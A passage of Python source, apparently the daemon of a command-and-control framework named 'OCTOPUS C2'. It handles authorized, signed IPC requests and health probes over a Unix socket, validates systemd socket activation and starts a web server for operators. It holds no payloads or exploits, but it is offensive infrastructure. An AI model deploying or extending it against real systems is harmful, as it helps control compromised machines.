        return participant.rollback(req, verified.principal, verified.resolved_key)

    if action == C2ControlAction.QUERY_C2_RESOURCE:
        return participant.reconcile(req)

    return BoundedControlErrorV2(
        reason_code=C2ControlErrorCodeV2.UNAVAILABLE,
        retryable=False,
        detail_ref="unsupported_control_action",
    )


def handle_client(
    conn: socket.socket,
    peer_resolver: Any | None = None,
) -> None:
    """Handle IPC requests with strict authorization boundary and signed responses."""
    if not _conn_semaphore.acquire(blocking=False):
        try:
            err = BoundedControlErrorV2(
                reason_code=C2ControlErrorCodeV2.UNAVAILABLE,
                retryable=True,
                detail_ref="server_connection_limit_reached",
            )
            conn.sendall(_control_codec.encode_response(err))
        except OSError:
            pass
        finally:
            conn.close()
        return

    try:
        with suppress(AttributeError):
            conn.settimeout(15.0)
        req_count = 0
        peer = extract_peer_principal(conn, peer_resolver=peer_resolver)
        boundary = get_control_boundary()

        while req_count < MAX_REQUESTS_PER_CONNECTION:
            try:
                frame_data = receive_frame(conn, max_size=MAX_CONTROL_FRAME_SIZE)
            except (ConnectionResetError, EOFError):
                break
            except Exception as exc:
                logger.warning("Unauthenticated frame reading error: %s", exc)
                # Fail-closed: close connection without emitting unauthenticated response with empty correlation
                break

            req_count += 1

            # Check if frame_data is dedicated health probe request
            if b'"type":"health_request_v2"' in frame_data or b'"type": "health_request_v2"' in frame_data:
                try:
                    health_req = strict_json_loads(frame_data)
                    probe_nonce = str(health_req.get("nonce", ""))
                    key_id, signer = get_daemon_response_signer()
                    service_id = get_service_id()
                    issued_at_ms = int(time.time() * 1000)
                    db_ready = False
                    with suppress(Exception):
                        from core.c2.control_migrations import verify_schema_ready

                        ctrl_db = get_control_db_path()
                        with sqlite3.connect(ctrl_db, timeout=2.0) as test_conn:
                            db_ready = verify_schema_ready(test_conn)
                    ks_ready = True
                    body_dict = {
                        "boot_instance_id": BOOT_INSTANCE_ID,
                        "daemon_generation": DAEMON_GENERATION,
                        "database_ready": db_ready,
                        "issued_at_ms": issued_at_ms,
                        "key_id": key_id,
                        "key_store_ready": ks_ready,
                        "probe_nonce": probe_nonce,
                        "protocol_version": "2.0",
                        "service_id": service_id,
                    }
                    transcript = calculate_health_signature_digest(body_dict)
                    signature = signer.sign(transcript)
                    body_dict["signature"] = signature
                    body_dict["type"] = "signed_health_response_v2"
                    resp_bytes = canonical_json_bytes(body_dict)
                    conn.sendall(len(resp_bytes).to_bytes(4, byteorder="big") + resp_bytes)
                    continue
                except Exception as exc:
                    logger.warning("Health probe error: %s", exc)
                    break

            try:
                framed_req = _control_codec.decode_request(frame_data)
            except Exception as exc:
                logger.warning("Malformed request decoding error: %s", exc)
                # Fail-closed: close connection without emitting unauthenticated response with empty correlation
                break

            try:
                verified = boundary.authorize(framed_req, peer)
                response = _dispatch_verified_request(verified)
            except ControlBoundaryError as exc:
                reason = C2ControlErrorCodeV2.NOT_AUTHORIZED
                detail = str(exc)
                if "replay" in str(exc).lower():
                    reason = C2ControlErrorCodeV2.REPLAY
                    detail = "nonce_replayed"
                elif "malformed" in str(exc).lower():
                    reason = C2ControlErrorCodeV2.MALFORMED
                response = BoundedControlErrorV2(
                    reason_code=reason,
                    retryable=False,
                    detail_ref=detail,
                )
            except Exception as exc:
                logger.error("Internal failure during control request dispatch: %s", exc, exc_info=True)
                response = BoundedControlErrorV2(
                    reason_code=C2ControlErrorCodeV2.INTERNAL_FAILURE,
                    retryable=False,
                    detail_ref="internal_daemon_error",
                )

            signed_env = _sign_response_envelope(response, framed_req)
            resp_frame = _control_codec.encode_response(signed_env)
            conn.sendall(resp_frame)
    except Exception as exc:
        logger.warning("C2 control thread handling error: %s", exc, exc_info=True)
    finally:
        _conn_semaphore.release()
        with suppress(OSError):
            conn.close()


def run_socket_server(socket_override: str | None = None) -> None:
    """Unix Domain Socket control plane supporting strict systemd socket activation."""
    env = getattr(os, "environ", {})
    sock_path = socket_override or env.get("OCTOPUS_C2_SOCKET") or SOCK_FILE

    SD_LISTEN_FDS_START = 3
    listen_fds_env = env.get("LISTEN_FDS") if hasattr(env, "get") else None
    listen_pid_env = env.get("LISTEN_PID") if hasattr(env, "get") else None
    server = None

    if listen_fds_env and listen_pid_env:
        if str(os.getpid()) != listen_pid_env:
            raise RuntimeError("invalid_systemd_socket_activation: PID mismatch")
        try:
            num_fds = int(listen_fds_env)
        except ValueError as exc:
            raise RuntimeError("invalid_systemd_socket_activation: invalid LISTEN_FDS") from exc
        if num_fds != 1:
            raise RuntimeError(f"invalid_systemd_socket_activation: expected 1 fd, got {num_fds}")
        try:
            raw_sock = socket.socket(fileno=SD_LISTEN_FDS_START)
            if (
                raw_sock.family != getattr(socket, "AF_UNIX", 1)
                or raw_sock.type != socket.SOCK_STREAM
                or raw_sock.getsockopt(socket.SOL_SOCKET, socket.SO_ACCEPTCONN) != 1
            ):
                raise RuntimeError("invalid_systemd_socket_activation: socket not AF_UNIX stream in listen mode")
            bound_path = raw_sock.getsockname()
            if bound_path and os.path.abspath(bound_path) != os.path.abspath(sock_path):
                raise RuntimeError(
                    f"invalid_systemd_socket_activation: socket path mismatch {bound_path} != {sock_path}"
                )
            server = raw_sock
            os.environ.pop("LISTEN_FDS", None)
            os.environ.pop("LISTEN_PID", None)
            logger.info("Control Plane inherited socket from systemd (fd %d)", SD_LISTEN_FDS_START)
        except Exception as exc:
            raise RuntimeError(f"invalid_systemd_socket_activation: {exc}") from exc

    if server is None:
        if os.path.exists(sock_path):
            raise RuntimeError(f"control socket already exists: {sock_path}")

        with suppress(Exception):
            parent_dir = os.path.dirname(os.path.abspath(sock_path))
            if parent_dir:
                os.makedirs(parent_dir, mode=0o750, exist_ok=True)

        try:
            server = socket.socket(getattr(socket, "AF_UNIX", 1), socket.SOCK_STREAM)
            server.bind(sock_path)
            server.listen(32)
        except Exception as exc:
            raise RuntimeError(f"failed to bind control socket: {exc}") from exc
        with suppress(Exception):
            os.chmod(sock_path, 0o660)
        logger.info("Control Plane listening on %s", sock_path)

    server_ready_event.set()

    while True:
        try:
            conn, _ = server.accept()
            threading.Thread(target=handle_client, args=(conn,), daemon=True).start()
        except OSError:
            break


# ─── Main ────────────────────────────────────────────────


def main() -> None:
    application = create_app()

    sock_thread = threading.Thread(target=run_socket_server, daemon=True)
    sock_thread.start()

    host = os.environ.get("OCTOPUS_C2_HOST", "127.0.0.1")
    try:
        port = int(os.environ.get("OCTOPUS_C2_PORT", "8443"))
    except ValueError as exc:
        raise RuntimeError("OCTOPUS_C2_PORT must be an integer") from exc
    if not 1 <= port <= 65535:
        raise RuntimeError("OCTOPUS_C2_PORT is outside the valid range")

    print(f"[*] Starting OCTOPUS C2 Daemon v{C2_PROTOCOL_VERSION} on {host}:{port}")
    print(f"[*] Event Store: {DB_PATH}")
    print(f"[*] RBAC: {len(operators.list_operators())} operator(s)")

    try:
        uvicorn.run(application, host=host, port=port, log_level="warning")
    except OSError as e:
        if "Address already in use" in str(e):
            print(f"[!] Port {port} already in use. Kill existing process or change port.")
        else:
            raise


if __name__ == "__main__":
    main()
